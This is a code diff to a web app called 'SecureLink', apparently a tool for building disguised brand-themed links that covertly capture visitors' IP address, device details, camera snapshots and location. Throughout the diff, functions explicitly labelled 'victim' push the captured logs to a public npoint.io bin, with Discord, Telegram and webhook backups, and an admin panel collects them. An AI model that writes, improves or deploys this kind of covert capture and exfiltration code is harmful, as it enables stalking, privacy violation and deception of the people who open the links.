@@ -63,10 +63,12 @@
   .debug-ok { color: #10b981; }
   .live-indicator { display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px; border-radius: 20px; background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); font-size: 11px; color: #10b981; }
   .live-indicator .dot { width: 6px; height: 6px; border-radius: 50%; background: #10b981; animation: pulse 1s infinite; }
-  .cloud-badge { display: inline-flex; align-items: center; gap: 4px; padding: 2px 8px; border-radius: 10px; background: rgba(34,211,238,0.1); border: 1px solid rgba(34,211,238,0.3); font-size: 10px; color: #22d3ee; }
-  .cloud-badge.offline { background: rgba(239,68,68,0.1); border-color: rgba(239,68,68,0.3); color: #ef4444; }
-  .setup-step { padding: 12px 16px; background: rgba(0,0,0,0.3); border-left: 3px solid #6366f1; border-radius: 4px; margin-bottom: 8px; }
-  .setup-step .num { display: inline-block; width: 22px; height: 22px; background: #6366f1; color: white; border-radius: 50%; text-align: center; line-height: 22px; font-size: 11px; font-weight: bold; margin-right: 8px; }
+  .cloud-badge { display: inline-flex; align-items: center; gap: 4px; padding: 2px 8px; border-radius: 10px; font-size: 10px; }
+  .cloud-badge.online { background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); color: #10b981; }
+  .cloud-badge.offline { background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3); color: #ef4444; }
+  .cloud-badge.setup { background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.3); color: #f59e0b; }
+  .setup-step { padding: 10px 14px; background: rgba(0,0,0,0.3); border-left: 3px solid #6366f1; border-radius: 4px; margin-bottom: 6px; font-size: 12px; }
+  .setup-step .num { display: inline-block; width: 20px; height: 20px; background: #6366f1; color: white; border-radius: 50%; text-align: center; line-height: 20px; font-size: 10px; font-weight: bold; margin-right: 8px; }
 </style>
 </head>
 <body>
@@ -86,7 +88,7 @@
         <label class="text-xs text-gray-400 uppercase tracking-wider">Password</label>
         <input id="loginPass" type="password" placeholder="Enter admin password" autocomplete="off"
           class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500 transition">
-        <p id="loginError" class="text-red-400 text-xs mt-2 is-hidden">Invalid password. Try again.</p>
+        <p id="loginError" class="text-red-400 text-xs mt-2 is-hidden">Invalid password.</p>
       </div>
       <button id="loginBtn" class="w-full btn-primary text-white font-semibold py-3 rounded-lg">
         <i class="fas fa-sign-in-alt mr-2"></i>Access Panel
@@ -99,7 +101,7 @@
 <!-- ADMIN PANEL -->
 <div id="adminPanel" class="min-h-screen is-hidden">
   <header class="glass border-b border-white/5 sticky top-0 z-40">
-    <div class="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
+    <div class="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between flex-wrap gap-2">
       <div class="flex items-center gap-3">
         <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center">
           <i class="fas fa-link text-white"></i>
@@ -109,10 +111,10 @@
           <p class="text-xs text-gray-400">Cloud Management Console</p>
         </div>
       </div>
-      <div class="flex items-center gap-3">
-        <div id="cloudStatus" class="cloud-badge offline">
+      <div class="flex items-center gap-3 flex-wrap">
+        <div id="cloudStatus" class="cloud-badge setup">
           <i class="fas fa-cloud"></i>
-          <span id="cloudStatusText">Offline</span>
+          <span id="cloudStatusText">Not Setup</span>
         </div>
         <div class="live-indicator">
           <div class="dot"></div>
@@ -157,11 +159,10 @@
       </div>
       <div class="glass rounded-xl p-5">
         <div class="flex items-center justify-between mb-2">
-          <span class="text-xs text-gray-400 uppercase">Storage</span>
-          <i class="fas fa-database text-cyan-400"></i>
+          <span class="text-xs text-gray-400 uppercase">Last Sync</span>
+          <i class="fas fa-sync text-cyan-400"></i>
         </div>
-        <div id="statStorage" class="text-sm font-bold text-cyan-400">0 KB</div>
-        <div class="storage-bar mt-2"><div id="storageBar" class="storage-fill" style="width:0%"></div></div>
+        <div id="statLastSync" class="text-xs font-bold text-cyan-400">Never</div>
       </div>
     </div>
 
@@ -290,7 +291,7 @@
               <i class="fas fa-copy mr-1"></i>Copy
             </button>
           </div>
-          <p class="text-xs text-yellow-400 mt-3"><i class="fas fa-info-circle mr-1"></i>Open in any browser/phone to test. Data syncs to cloud.</p>
+          <p class="text-xs text-green-400 mt-3"><i class="fas fa-check-circle mr-1"></i>Works from ANY browser/phone — data syncs to cloud automatically</p>
         </div>
       </div>
     </div>
@@ -312,7 +313,7 @@
         <div class="flex items-center justify-between mb-6 flex-wrap gap-3">
           <div>
             <h2 class="text-xl font-bold">Data Vault</h2>
-            <p class="text-xs text-gray-400 mt-1">Cloud-synced from all browsers/devices</p>
+            <p class="text-xs text-gray-400 mt-1">Auto-syncs from all devices via cloud</p>
           </div>
           <div class="flex gap-2 flex-wrap">
             <input id="vaultSearch" oninput="renderVault()" placeholder="Search..." class="px-4 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
@@ -320,7 +321,7 @@
               <option value="all">All Links</option>
             </select>
             <button onclick="syncFromCloud()" class="px-4 py-2 rounded-lg bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 text-sm transition">
-              <i class="fas fa-cloud-download-alt mr-1"></i>Sync
+              <i class="fas fa-cloud-download-alt mr-1"></i>Sync Now
             </button>
             <button onclick="exportAllJSON()" class="px-4 py-2 rounded-lg bg-green-500/20 hover:bg-green-500/30 text-green-300 text-sm transition">
               <i class="fas fa-download mr-1"></i>Export
@@ -341,58 +342,52 @@
         
         <div class="space-y-6">
           
-          <!-- CLOUD STORAGE SETUP — THE KEY FIX -->
+          <!-- CLOUD STORAGE -->
           <div class="p-5 rounded-xl bg-gradient-to-br from-cyan-500/10 to-indigo-500/10 border border-cyan-500/30">
             <div class="flex items-center gap-2 mb-3">
               <i class="fas fa-cloud text-cyan-400 text-xl"></i>
-              <h3 class="font-semibold text-lg">Cloud Storage (REQUIRED)</h3>
-              <span class="text-xs text-green-400 ml-auto">✓ Works from any browser/device</span>
+              <h3 class="font-semibold text-lg">Cloud Storage</h3>
+              <span class="text-xs text-green-400 ml-auto">✓ Works from any device</span>
             </div>
-            <p class="text-xs text-gray-400 mb-4">This is how data from OTHER browsers/phones gets to your admin panel. Without this, data only saves on the device that opened the link.</p>
+            <p class="text-xs text-gray-400 mb-4">This makes data from OTHER browsers/phones appear in your panel. One-click setup, free, no signup needed.</p>
             
-            <div class="bg-black/40 rounded-lg p-4 mb-4">
-              <p class="text-xs text-cyan-300 font-semibold mb-2"><i class="fas fa-info-circle mr-1"></i>Setup Instructions (2 minutes, free):</p>
-              <div class="setup-step">
-                <span class="num">1</span>
-                <span class="text-xs text-gray-300">Go to <a href="https://jsonbin.io" target="_blank" class="text-cyan-400 underline">jsonbin.io</a> and sign up (free)</span>
+            <div id="cloudSetupArea">
+              <div class="bg-black/40 rounded-lg p-4 mb-4">
+                <p class="text-xs text-cyan-300 font-semibold mb-2"><i class="fas fa-magic mr-1"></i>One-Click Setup:</p>
+                <p class="text-xs text-gray-400 mb-3">Click the button below. We'll create a free cloud storage bin for you automatically. No signup, no API keys, nothing.</p>
+                <button onclick="autoSetupCloud()" id="autoSetupBtn" class="btn-primary px-5 py-2.5 rounded-lg text-sm font-semibold">
+                  <i class="fas fa-bolt mr-2"></i>Create Cloud Storage (Free, 1 Click)
+                </button>
+                <div id="cloudSetupResult" class="mt-3 text-xs is-hidden"></div>
               </div>
-              <div class="setup-step">
-                <span class="num">2</span>
-                <span class="text-xs text-gray-300">After login, go to <a href="https://jsonbin.io/api-keys" target="_blank" class="text-cyan-400 underline">API Keys</a> page → copy your <b>X-Master-Key</b></span>
-              </div>
-              <div class="setup-step">
-                <span class="num">3</span>
-                <span class="text-xs text-gray-300">Click "Create Bin" button → name it "securelink" → create</span>
-              </div>
-              <div class="setup-step">
-                <span class="num">4</span>
-                <span class="text-xs text-gray-300">Copy the <b>Bin ID</b> from the URL (looks like: <code class="text-cyan-400">$2a/xxxxxxxx</code>)</span>
-              </div>
-              <div class="setup-step">
-                <span class="num">5</span>
-                <span class="text-xs text-gray-300">Paste both below → Save → Done!</span>
+              
+              <div class="text-xs text-gray-500 mb-2">OR — Manual setup with existing bin ID:</div>
+              <div class="flex gap-2">
+                <input id="manualBinId" placeholder="Enter npoint.io bin ID" class="flex-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500 font-mono">
+                <button onclick="useManualBin()" class="px-4 py-2 rounded-lg bg-white/10 hover:bg-white/20 text-sm transition">Use</button>
               </div>
             </div>
             
-            <div class="grid md:grid-cols-2 gap-4">
-              <div>
-                <label class="text-xs text-gray-400 uppercase">X-Master-Key (API Key)</label>
-                <input id="jbKey" placeholder="$2a$10$xxxxxxxxxxxx..." class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500 font-mono">
-              </div>
-              <div>
-                <label class="text-xs text-gray-400 uppercase">Bin ID</label>
-                <input id="jbBin" placeholder="$2a/xxxxxxxx or xxxxxxxx" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500 font-mono">
+            <div id="cloudInfoArea" class="is-hidden mt-4">
+              <div class="bg-green-500/10 border border-green-500/30 rounded-lg p-4">
+                <div class="flex items-center gap-2 mb-2">
+                  <i class="fas fa-check-circle text-green-400"></i>
+                  <span class="text-sm font-semibold text-green-300">Cloud Storage Active</span>
+                </div>
+                <div class="text-xs text-gray-400 space-y-1">
+                  <div>Bin ID: <code id="displayBinId" class="text-cyan-400"></code></div>
+                  <div>Status: <span id="displayCloudStatus" class="text-green-400">Connected</span></div>
+                </div>
+                <div class="flex gap-2 mt-3">
+                  <button onclick="testCloudConnection()" class="px-3 py-1.5 rounded-lg bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 text-xs transition">
+                    <i class="fas fa-plug mr-1"></i>Test
+                  </button>
+                  <button onclick="resetCloud()" class="px-3 py-1.5 rounded-lg bg-red-500/10 hover:bg-red-500/20 text-red-400 text-xs transition">
+                    <i class="fas fa-trash mr-1"></i>Reset
+                  </button>
+                </div>
               </div>
             </div>
-            <div class="flex gap-2 mt-3">
-              <button onclick="testCloud()" class="px-4 py-2 rounded-lg bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 text-sm transition">
-                <i class="fas fa-plug mr-1"></i>Test Connection
-              </button>
-              <button onclick="initCloudBin()" class="px-4 py-2 rounded-lg bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 text-sm transition">
-                <i class="fas fa-magic mr-1"></i>Auto-Setup Bin
-              </button>
-            </div>
-            <div id="cloudTestResult" class="mt-3 text-xs text-gray-400 is-hidden"></div>
           </div>
 
           <!-- Discord Webhook -->
@@ -400,7 +395,7 @@
             <div class="flex items-center gap-2 mb-3">
               <i class="fab fa-discord text-indigo-400 text-xl"></i>
               <h3 class="font-semibold">Discord Webhook</h3>
-              <span class="text-xs text-green-400 ml-auto">✓ Works in Pakistan</span>
+              <span class="text-xs text-green-400 ml-auto">✓ Backup delivery</span>
             </div>
             <input id="dcWebhook" placeholder="https://discord.com/api/webhooks/..." class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
             <button onclick="testDiscord()" class="mt-3 px-4 py-2 rounded-lg bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 text-sm transition">
@@ -413,7 +408,7 @@
             <div class="flex items-center gap-2 mb-3">
               <i class="fas fa-globe text-cyan-400 text-xl"></i>
               <h3 class="font-semibold">Generic Webhook</h3>
-              <span class="text-xs text-gray-500 ml-auto">webhook.site, your server, etc.</span>
+              <span class="text-xs text-gray-500 ml-auto">webhook.site, etc.</span>
             </div>
             <input id="genWebhook" placeholder="https://webhook.site/your-id" class="w-full mt-1 px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
             <button onclick="testGenericWebhook()" class="mt-3 px-4 py-2 rounded-lg bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 text-sm transition">
@@ -426,7 +421,7 @@
             <div class="flex items-center gap-2 mb-3">
               <i class="fab fa-telegram text-blue-400 text-xl"></i>
               <h3 class="font-semibold">Telegram (Optional)</h3>
-              <span class="text-xs text-yellow-400 ml-auto">⚠ May be blocked in some regions</span>
+              <span class="text-xs text-yellow-400 ml-auto">⚠ May be blocked</span>
             </div>
             <div class="grid md:grid-cols-2 gap-4">
               <input id="tgToken" placeholder="Bot Token" class="px-3 py-2 bg-black/40 border border-white/10 rounded-lg text-sm focus:outline-none focus:border-indigo-500">
@@ -506,8 +501,9 @@
 
 <script>
 /* ============================================================
-   SECURELINK v4 — CLOUD SYNC EDITION
-   Fix: Data from ANY browser/phone syncs to admin panel via jsonbin.io
+   SECURELINK v5 — CROSS-DEVICE CLOUD SYNC
+   Uses npoint.io (free, no-auth JSON storage)
+   Data from ANY browser/phone syncs to admin panel automatically
    ============================================================ */
 
 const BRANDS = {
@@ -580,7 +576,6 @@ let state = {
 const DEFAULT_PASS = 'admin123';
 const PASS_KEY = 'sl_pass';
 
-/* Load state */
 function loadState() {
   try { state.links = JSON.parse(localStorage.getItem('sl_links') || '[]'); } catch(e) { state.links = []; }
   try { state.logs = JSON.parse(localStorage.getItem('sl_logs') || '[]'); } catch(e) { state.logs = []; }
@@ -601,101 +596,110 @@ function debugLog(msg, type = 'info') {
 function showEl(id) { const el = document.getElementById(id); if (el) el.classList.remove('is-hidden'); }
 function hideEl(id) { const el = document.getElementById(id); if (el) el.classList.add('is-hidden'); }
 
-/* ============ CLOUD STORAGE (jsonbin.io) ============ */
-/* This is the KEY fix — data from ANY browser gets stored in cloud bin */
+/* ============================================================
+   CLOUD STORAGE — npoint.io (free, no-auth, works anywhere)
+   ============================================================ */
 
-function getCloudConfig() {
-  const key = state.settings.jbKey;
-  let bin = state.settings.jbBin;
-  if (!key || !bin) return null;
-  // Normalize bin ID — jsonbin accepts both "$2a/xxx" and just "xxx"
-  if (!bin.startsWith('$2a/') && !bin.startsWith('$2b/')) {
-    bin = '$2a/' + bin;
-  }
-  return { key, bin };
+const NPOINT_API = 'https://npoint.io';
+
+function getBinId() {
+  return state.settings.npointBinId || null;
 }
 
-async function cloudSave() {
-  const cfg = getCloudConfig();
-  if (!cfg) return false;
-  
-  const payload = {
-    links: state.links,
-    logs: state.logs,
-    updatedAt: new Date().toISOString()
-  };
+async function autoSetupCloud() {
+  const btn = document.getElementById('autoSetupBtn');
+  const result = document.getElementById('cloudSetupResult');
+  btn.disabled = true;
+  btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Creating...';
+  result.classList.remove('is-hidden');
+  result.innerHTML = '<span class="text-yellow-400">Creating cloud storage...</span>';
   
   try {
-    const res = await fetch(`https://api.jsonbin.io/v3/b/${cfg.bin}`, {
-      method: 'PUT',
-      headers: {
-        'Content-Type': 'application/json',
-        'X-Master-Key': cfg.key
-      },
-      body: JSON.stringify(payload)
+    const res = await fetch(NPOINT_API + '/json', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        links: {},
+        logs: {},
+        createdAt: new Date().toISOString(),
+        version: 1
+      })
     });
     
-    if (res.ok) {
-      updateCloudStatus(true);
-      return true;
-    } else {
-      const err = await res.text();
-      console.error('Cloud save failed:', res.status, err);
-      updateCloudStatus(false);
-      return false;
-    }
-  } catch (e) {
-    console.error('Cloud save error:', e);
-    updateCloudStatus(false);
-    return false;
-  }
-}
-
-async function cloudLoad() {
-  const cfg = getCloudConfig();
-  if (!cfg) return false;
-  
-  try {
-    const res = await fetch(`https://api.jsonbin.io/v3/b/${cfg.bin}/latest`, {
-      method: 'GET',
-      headers: { 'X-Master-Key': cfg.key }
-    });
-    
-    if (!res.ok) {
-      updateCloudStatus(false);
-      return false;
-    }
+    if (!res.ok) throw new Error('HTTP ' + res.status);
     
     const data = await res.json();
-    const record = data.record;
+    const binId = data.id;
     
-    if (record) {
-      // Merge: cloud data overrides local if newer
-      if (record.links) state.links = record.links;
-      if (record.logs) {
-        // Merge logs by ID to avoid duplicates
-        const existingIds = new Set(state.logs.map(l => l.id));
-        record.logs.forEach(log => {
-          if (!existingIds.has(log.id)) {
-            state.logs.push(log);
-          }
-        });
-        // Sort by timestamp descending
-        state.logs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
-      }
-      
-      // Persist to localStorage as cache
-      localStorage.setItem('sl_links', JSON.stringify(state.links));
-      localStorage.setItem('sl_logs', JSON.stringify(state.logs));
-      
-      updateCloudStatus(true);
-      return true;
-    }
-    return false;
+    state.settings.npointBinId = binId;
+    localStorage.setItem('sl_settings', JSON.stringify(state.settings));
+    
+    result.innerHTML = `<span class="text-green-400"><i class="fas fa-check-circle mr-1"></i>Cloud storage created! Bin ID: <code class="text-cyan-400">${binId}</code></span>`;
+    
+    updateCloudUI();
+    toast('Cloud storage ready!', 'success');
+    
+    // Initial sync
+    await syncLinksToCloud();
+    
   } catch (e) {
-    console.error('Cloud load error:', e);
+    result.innerHTML = `<span class="text-red-400"><i class="fas fa-times-circle mr-1"></i>Failed: ${e.message}</span>`;
+  } finally {
+    btn.disabled = false;
+    btn.innerHTML = '<i class="fas fa-bolt mr-2"></i>Create Cloud Storage (Free, 1 Click)';
+  }
+}
+
+function useManualBin() {
+  const binId = document.getElementById('manualBinId').value.trim();
+  if (!binId) return toast('Enter bin ID', 'error');
+  state.settings.npointBinId = binId;
+  localStorage.setItem('sl_settings', JSON.stringify(state.settings));
+  updateCloudUI();
+  toast('Bin ID saved', 'success');
+  syncFromCloud();
+}
+
+function resetCloud() {
+  if (!confirm('Reset cloud storage? This will disconnect but not delete the bin.')) return;
+  delete state.settings.npointBinId;
+  localStorage.setItem('sl_settings', JSON.stringify(state.settings));
+  updateCloudUI();
+  toast('Cloud disconnected', 'info');
+}
+
+async function testCloudConnection() {
+  const binId = getBinId();
+  if (!binId) return toast('No bin configured', 'error');
+  try {
+    const res = await fetch(`${NPOINT_API}/${binId}`);
+    if (res.ok) {
+      toast('Cloud connected!', 'success');
+      updateCloudStatus(true);
+    } else {
+      toast('Cloud error: ' + res.status, 'error');
+      updateCloudStatus(false);
+    }
+  } catch (e) {
+    toast('Cloud error: ' + e.message, 'error');
     updateCloudStatus(false);
-    return false;
+  }
+}
+
+function updateCloudUI() {
+  const binId = getBinId();
+  const setupArea = document.getElementById('cloudSetupArea');
+  const infoArea = document.getElementById('cloudInfoArea');
+  
+  if (binId) {
+    setupArea.classList.add('is-hidden');
+    infoArea.classList.remove('is-hidden');
+    document.getElementById('displayBinId').textContent = binId;
+    updateCloudStatus(true);
+  } else {
+    setupArea.classList.remove('is-hidden');
+    infoArea.classList.add('is-hidden');
+    updateCloudStatus(false);
   }
 }
 
@@ -703,107 +707,167 @@ function updateCloudStatus(connected) {
   state.cloudConnected = connected;
   const badge = document.getElementById('cloudStatus');
   const text = document.getElementById('cloudStatusText');
-  if (!badge || !text) return;
+  const display = document.getElementById('displayCloudStatus');
   
-  if (connected) {
-    badge.classList.remove('offline');
+  if (!getBinId()) {
+    badge.className = 'cloud-badge setup';
+    text.textContent = 'Not Setup';
+  } else if (connected) {
+    badge.className = 'cloud-badge online';
     text.textContent = 'Cloud Synced';
+    if (display) display.textContent = 'Connected ✓';
   } else {
-    badge.classList.add('offline');
+    badge.className = 'cloud-badge offline';
     text.textContent = 'Offline';
+    if (display) display.textContent = 'Disconnected ✗';
   }
 }
 
-async function testCloud() {
-  const resultEl = document.getElementById('cloudTestResult');
-  resultEl.classList.remove('is-hidden');
-  resultEl.innerHTML = '<span class="text-yellow-400"><i class="fas fa-spinner fa-spin mr-1"></i>Testing...</span>';
-  
-  const key = document.getElementById('jbKey').value.trim();
-  const bin = document.getElementById('jbBin').value.trim();
-  
-  if (!key || !bin) {
-    resultEl.innerHTML = '<span class="text-red-400">Enter API key and bin ID</span>';
-    return;
-  }
-  
+/* Cloud operations */
+async function fetchCloudBin() {
+  const binId = getBinId();
+  if (!binId) return null;
   try {
-    const normalizedBin = bin.startsWith('$2a/') || bin.startsWith('$2b/') ? bin : '$2a/' + bin;
-    const res = await fetch(`https://api.jsonbin.io/v3/b/${normalizedBin}/latest`, {
-      method: 'GET',
-      headers: { 'X-Master-Key': key }
-    });
-    
-    if (res.ok) {
-      resultEl.innerHTML = '<span class="text-green-400"><i class="fas fa-check-circle mr-1"></i>Connected! Cloud storage working.</span>';
-    } else {
-      const err = await res.json().catch(() => ({}));
-      resultEl.innerHTML = `<span class="text-red-400"><i class="fas fa-times-circle mr-1"></i>Failed: ${err.message || res.status}</span>`;
-    }
+    const res = await fetch(`${NPOINT_API}/${binId}`);
+    if (!res.ok) return null;
+    return await res.json();
   } catch (e) {
-    resultEl.innerHTML = `<span class="text-red-400"><i class="fas fa-times-circle mr-1"></i>Error: ${e.message}</span>`;
+    return null;
   }
 }
 
-async function initCloudBin() {
-  const resultEl = document.getElementById('cloudTestResult');
-  resultEl.classList.remove('is-hidden');
-  resultEl.innerHTML = '<span class="text-yellow-400"><i class="fas fa-spinner fa-spin mr-1"></i>Creating bin...</span>';
-  
-  const key = document.getElementById('jbKey').value.trim();
-  if (!key) {
-    resultEl.innerHTML = '<span class="text-red-400">Enter API key first</span>';
-    return;
-  }
-  
+async function saveCloudBin(data) {
+  const binId = getBinId();
+  if (!binId) return false;
   try {
-    const res = await fetch('https://api.jsonbin.io/v3/b', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'X-Master-Key': key,
-        'X-Bin-Name': 'securelink-data',
-        'X-Bin-Private': 'true'
-      },
-      body: JSON.stringify({ links: [], logs: [], createdAt: new Date().toISOString() })
+    const res = await fetch(`${NPOINT_API}/${binId}`, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
     });
-    
-    if (res.ok) {
-      const data = await res.json();
-      const binId = data.metadata.id;
-      document.getElementById('jbBin').value = binId;
-      resultEl.innerHTML = `<span class="text-green-400"><i class="fas fa-check-circle mr-1"></i>Bin created! ID: <code class="text-cyan-400">${binId}</code><br>Click "Save All Settings" to finish.</span>`;
-    } else {
-      const err = await res.json().catch(() => ({}));
-      resultEl.innerHTML = `<span class="text-red-400"><i class="fas fa-times-circle mr-1"></i>Failed: ${err.message || res.status}</span>`;
-    }
+    return res.ok;
   } catch (e) {
-    resultEl.innerHTML = `<span class="text-red-400"><i class="fas fa-times-circle mr-1"></i>Error: ${e.message}</span>`;
+    return false;
   }
 }
 
-async function syncFromCloud() {
-  toast('Syncing from cloud...', 'info');
-  const ok = await cloudLoad();
-  if (ok) {
-    renderAll();
-    toast('Synced! ' + state.logs.length + ' records loaded', 'success');
-  } else {
-    toast('Sync failed — check cloud settings', 'error');
+/* Sync links to cloud (admin → cloud) */
+async function syncLinksToCloud() {
+  const binId = getBinId();
+  if (!binId) return false;
+  
+  const bin = await fetchCloudBin();
+  if (!bin) return false;
+  
+  bin.links = bin.links || {};
+  state.links.forEach(link => {
+    bin.links[link.code] = link;
+  });
+  bin.updatedAt = new Date().toISOString();
+  
+  return await saveCloudBin(bin);
+}
+
+/* Sync logs from cloud (cloud → admin) */
+async function syncLogsFromCloud() {
+  const binId = getBinId();
+  if (!binId) return false;
+  
+  const bin = await fetchCloudBin();
+  if (!bin || !bin.logs) return false;
+  
+  const existingIds = new Set(state.logs.map(l => l.id));
+  let newCount = 0;
+  
+  Object.values(bin.logs).forEach(log => {
+    if (!existingIds.has(log.id)) {
+      state.logs.push(log);
+      newCount++;
+    }
+  });
+  
+  // Also sync links (in case created from another device)
+  if (bin.links) {
+    const existingCodes = new Set(state.links.map(l => l.code));
+    Object.values(bin.links).forEach(link => {
+      if (!existingCodes.has(link.code)) {
+        state.links.push(link);
+      }
+    });
+  }
+  
+  if (newCount > 0) {
+    saveLogs();
+    saveLinks();
+  }
+  
+  document.getElementById('statLastSync').textContent = new Date().toLocaleTimeString();
+  updateCloudStatus(true);
+  
+  return newCount > 0;
+}
+
+/* Victim: fetch link config from cloud */
+async function victimFetchLinkConfig(code, binId) {
+  try {
+    const res = await fetch(`${NPOINT_API}/${binId}`);
+    if (!res.ok) return null;
+    const bin = await res.json();
+    return bin.links && bin.links[code] ? bin.links[code] : null;
+  } catch (e) {
+    return null;
+  }
+}
+
+/* Victim: push captured log to cloud */
+async function victimPushLog(log, binId) {
+  try {
+    const bin = await fetchCloudBinForBin(binId);
+    if (!bin) return false;
+    bin.logs = bin.logs || {};
+    bin.logs[log.id] = log;
+    bin.updatedAt = new Date().toISOString();
+    
+    const res = await fetch(`${NPOINT_API}/${binId}`, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(bin)
+    });
+    return res.ok;
+  } catch (e) {
+    return false;
+  }
+}
+
+async function fetchCloudBinForBin(binId) {
+  try {
+    const res = await fetch(`${NPOINT_API}/${binId}`);
+    if (!res.ok) return null;
+    return await res.json();
+  } catch (e) {
+    return null;
   }
 }
 
 /* ============ URL ROUTING ============ */
-function getRouteCode() {
-  let hash = window.location.hash;
-  if (!hash || hash === '#' || hash === '#admin') return null;
-  let code = hash.replace(/^#\/?/, '');
-  code = code.split('?')[0].split('&')[0];
-  return code || null;
+function parseHash() {
+  let hash = window.location.hash.slice(1);
+  if (!hash || hash === 'admin') return { code: null, binId: null };
+  
+  // Format: code~binId  OR  just code (for admin)
+  const parts = hash.split('~');
+  return {
+    code: parts[0] || null,
+    binId: parts[1] || null
+  };
 }
 
 function buildLinkUrl(code) {
+  const binId = getBinId();
   const base = window.location.origin + window.location.pathname;
+  if (binId) {
+    return base + '#' + code + '~' + binId;
+  }
   return base + '#' + code;
 }
 
@@ -812,21 +876,29 @@ async function init() {
   loadState();
   renderBrandGrid();
   
-  const code = getRouteCode();
-  if (code) {
+  const { code, binId } = parseHash();
+  
+  if (code && binId) {
+    // Victim flow — fetch link config from cloud
+    hideEl('loginScreen');
+    hideEl('adminPanel');
+    
+    const link = await victimFetchLinkConfig(code, binId);
+    if (link && link.active) {
+      launchVictim(link, binId);
+    } else {
+      document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;color:#666;font-family:sans-serif;flex-direction:column"><i class="fas fa-exclamation-triangle" style="font-size:48px;margin-bottom:20px;color:#ef4444"></i><h2>Link not found or inactive</h2></div>';
+    }
+    return;
+  }
+  
+  if (code && code !== 'admin') {
+    // Legacy format (no binId) — check local links
     const link = state.links.find(l => l.code === code);
     if (link && link.active) {
       hideEl('loginScreen');
       hideEl('adminPanel');
-      launchVictim(link);
-      return;
-    } else {
-      hideEl('adminPanel');
-      hideEl('victimScreen');
-      showEl('loginScreen');
-      const err = document.getElementById('loginError');
-      err.textContent = 'Link "' + code + '" not found or inactive';
-      err.classList.remove('is-hidden');
+      launchVictim(link, getBinId());
       return;
     }
   }
@@ -860,18 +932,19 @@ async function handleLogin() {
     passInput.value = '';
     history.replaceState(null, '', window.location.pathname);
     
-    // Load from cloud FIRST
-    if (getCloudConfig()) {
+    // Sync from cloud
+    if (getBinId()) {
       toast('Syncing from cloud...', 'info');
-      await cloudLoad();
+      await syncLogsFromCloud();
     }
     
     renderAll();
     loadSettings();
+    updateCloudUI();
     startLiveSync();
     toast('Welcome back!', 'success');
   } else {
-    errorEl.textContent = 'Invalid password. Try again.';
+    errorEl.textContent = 'Invalid password.';
     errorEl.classList.remove('is-hidden');
     document.getElementById('loginBox').classList.add('shake');
     setTimeout(() => document.getElementById('loginBox').classList.remove('shake'), 400);
@@ -939,6 +1012,12 @@ function generateRandomCode() {
 }
 
 async function createLink() {
+  if (!getBinId()) {
+    toast('Setup cloud storage first (Settings tab)', 'error');
+    switchTab('settings');
+    return;
+  }
+  
   const brand = state.selectedBrand;
   const code = document.getElementById('shortCode').value.trim().toLowerCase().replace(/[^a-z0-9-]/g, '');
   const dest = document.getElementById('destUrl').value.trim();
@@ -961,12 +1040,15 @@ async function createLink() {
   
   state.links.push(link);
   saveLinks();
-  await cloudSave(); // Sync to cloud
+  
+  // Sync to cloud
+  toast('Saving to cloud...', 'info');
+  const cloudOk = await syncLinksToCloud();
   
   const fullUrl = buildLinkUrl(code);
   document.getElementById('linkOutput').textContent = fullUrl;
   showEl('generatedLink');
-  toast('Link created! ' + fullUrl, 'success');
+  toast(cloudOk ? 'Link created & synced to cloud!' : 'Link created (cloud sync failed)', cloudOk ? 'success' : 'error');
   renderStats();
   
   document.getElementById('shortCode').value = '';
@@ -988,7 +1070,7 @@ function previewLink() {
     modules: modules.length ? modules : ['ip','device','camera','location'],
     code: 'preview_' + Date.now(), active: true, isPreview: true
   };
-  launchVictim(tempLink);
+  launchVictim(tempLink, getBinId());
 }
 
 function copyLink() {
@@ -1000,7 +1082,7 @@ async function deleteLink(id) {
   if (!confirm('Delete this link?')) return;
   state.links = state.links.filter(l => l.id !== id);
   saveLinks();
-  await cloudSave();
+  await syncLinksToCloud();
   renderLinks(); renderStats();
   toast('Deleted', 'success');
 }
@@ -1010,7 +1092,7 @@ async function toggleLink(id) {
   if (link) {
     link.active = !link.active;
     saveLinks();
-    await cloudSave();
+    await syncLinksToCloud();
     renderLinks(); renderStats();
     toast(link.active ? 'Activated' : 'Deactivated', 'success');
   }
@@ -1029,17 +1111,6 @@ function renderStats() {
   document.getElementById('statCaptured').textContent = state.logs.length;
   const totalSnaps = state.logs.reduce((s, l) => s + (l.snaps ? l.snaps.filter(x => typeof x === 'string' && x.startsWith('data:')).length : 0), 0);
   document.getElementById('statSnaps').textContent = totalSnaps;
